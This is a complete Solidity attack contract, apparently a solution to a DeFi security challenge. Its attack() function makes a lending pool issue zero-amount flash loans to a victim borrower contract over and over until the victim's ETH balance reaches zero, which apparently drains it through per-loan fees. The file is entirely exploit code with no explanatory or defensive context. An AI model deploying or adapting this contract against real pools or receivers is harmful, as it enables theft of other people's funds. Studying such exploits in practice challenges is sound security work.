// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Pool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerContract {
    Pool public pool;
    address public borrower;
    uint256 public constant BORROW_AMOUNT = 0;

    constructor(address _pool, address _borrower) {
        require(_pool != address(0), "invalid pool address");
        require(_borrower != address(0), "invalid borrower address");
        pool = Pool(_pool);
        borrower = _borrower;
    }

    function attack() public {
        while (borrower.balance > 0) {
            pool.flashLoan(borrower, BORROW_AMOUNT);
        }
    }
}
